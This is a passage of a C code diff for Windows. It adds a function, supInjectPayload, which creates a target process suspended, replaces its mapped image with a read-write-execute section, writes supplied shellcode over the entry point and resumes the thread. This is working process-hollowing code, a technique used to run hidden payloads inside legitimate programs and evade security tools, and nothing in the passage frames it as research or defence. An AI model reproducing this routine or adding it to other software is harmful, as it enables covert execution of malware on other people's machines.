+    PIMAGE_OPTIONAL_HEADER32 oh32 = (PIMAGE_OPTIONAL_HEADER32)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
+    PIMAGE_OPTIONAL_HEADER64 oh64 = (PIMAGE_OPTIONAL_HEADER64)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
+
+    if (fileHeader->Machine == IMAGE_FILE_MACHINE_I386) {
+#pragma warning(push)
+#pragma warning(disable: 4312)
+        return RtlOffsetToPointer(oh32->ImageBase, oh32->AddressOfEntryPoint);
+#pragma warning(pop)
+    }
+    else if (fileHeader->Machine == IMAGE_FILE_MACHINE_AMD64) {
+        return RtlOffsetToPointer(oh64->ImageBase, oh64->AddressOfEntryPoint);
+    }
+    else
+        return NULL;
+}
+
+/*
+* supInjectPayload
+*
+* Purpose:
+*
+* Run payload shellcode at app entry point.
+*
+*/
+NTSTATUS supInjectPayload(
+    _In_ PVOID pvTargetImage,
+    _In_ PVOID pvShellCode,
+    _In_ ULONG cbShellCode,
+    _In_ LPWSTR lpTargetModule,
+    _Out_ PHANDLE phZombieProcess
+)
+{
+    NTSTATUS                    ntStatus;
+    ULONG                       offset, returnLength = 0;
+    HANDLE                      sectionHandle = NULL;
+
+    PIMAGE_DOS_HEADER           dosHeader;
+    PIMAGE_FILE_HEADER          fileHeader;
+    PIMAGE_OPTIONAL_HEADER      optHeader;
+
+    LPVOID                      pvImageBase = NULL, pvLocalBase;
+    SIZE_T                      viewSize, readBytes = 0;
+    LARGE_INTEGER               secMaxSize;
+
+    PROCESS_BASIC_INFORMATION   processBasicInfo;
+    PROCESS_INFORMATION         processInfo;
+    STARTUPINFO                 startupInfo;
+
+    do {
+
+        *phZombieProcess = NULL;
+
+        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
+        startupInfo.cb = sizeof(startupInfo);
+
+        processInfo.hProcess = NULL;
+        processInfo.hThread = NULL;
+
+        dosHeader = (PIMAGE_DOS_HEADER)pvTargetImage;
+        fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
+        optHeader = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
+        secMaxSize.QuadPart = optHeader->SizeOfImage;
+
+        if (fileHeader->Machine != IMAGE_FILE_MACHINE_I386 &&
+            fileHeader->Machine != IMAGE_FILE_MACHINE_AMD64)
+        {
+            ntStatus = STATUS_NOT_SUPPORTED;
+            break;
+        }
+
+        ntStatus = NtCreateSection(&sectionHandle,
+            SECTION_ALL_ACCESS,
+            NULL,
+            &secMaxSize,
+            PAGE_EXECUTE_READWRITE,
+            SEC_COMMIT,
+            NULL);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            break;
+        }
+
+        SetLastError(0);
+
+        if (!CreateProcess(NULL,
+            lpTargetModule,
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS,
+            NULL,
+            NULL,
+            &startupInfo,
+            &processInfo))
+        {
+            ntStatus = STATUS_FATAL_APP_EXIT;
+            break;
+        }
+
+        ntStatus = NtQueryInformationProcess(processInfo.hProcess,
+            ProcessBasicInformation,
+            &processBasicInfo,
+            sizeof(PROCESS_BASIC_INFORMATION),
+            &returnLength);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            break;
+        }
+
+        offset = FIELD_OFFSET(PEB, ImageBaseAddress);
+
+        if (!ReadProcessMemory(processInfo.hProcess,
+            RtlOffsetToPointer(processBasicInfo.PebBaseAddress, offset),
+            &pvImageBase,
+            sizeof(PVOID),
+            &readBytes))
+        {
+            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
+            break;
+        }
+
+        viewSize = optHeader->SizeOfImage;
+        pvLocalBase = NULL;
+
+        ntStatus = NtMapViewOfSection(sectionHandle,
+            NtCurrentProcess(),
+            &pvLocalBase,
+            0,
+            optHeader->SizeOfImage,
+            NULL,
+            &viewSize,
+            ViewUnmap,
+            0,
+            PAGE_EXECUTE_READWRITE);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            break;
+        }
+
+        if (!ReadProcessMemory(processInfo.hProcess,
+            pvImageBase,
+            pvLocalBase,
+            optHeader->SizeOfImage,
+            &readBytes))
+        {
+            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
+            break;
+        }
+
+        ntStatus = NtUnmapViewOfSection(processInfo.hProcess, pvImageBase);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            break;
+        }
+
+        viewSize = optHeader->SizeOfImage;
+
+        ntStatus = NtMapViewOfSection(sectionHandle,
+            processInfo.hProcess,
+            &pvImageBase,
+            0,
+            optHeader->SizeOfImage,
+            NULL,
+            &viewSize,
+            ViewShare,
+            0,
+            PAGE_EXECUTE_READWRITE);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            break;
+        }
+
+        RtlCopyMemory(RtlOffsetToPointer(pvLocalBase, optHeader->AddressOfEntryPoint),
+            pvShellCode,
+            cbShellCode);
+
+        ResumeThread(processInfo.hThread);
+
+        *phZombieProcess = processInfo.hProcess;
+
+    } while (FALSE);
+
+    if (!NT_SUCCESS(ntStatus)) {
+
+        if (processInfo.hProcess != NULL)
+            CloseHandle(processInfo.hProcess);
+
+    }
+
+    if (sectionHandle != NULL)
+        NtClose(sectionHandle);
+
+    if (processInfo.hThread != NULL)
+        CloseHandle(processInfo.hThread);
+
+    return ntStatus;
 }
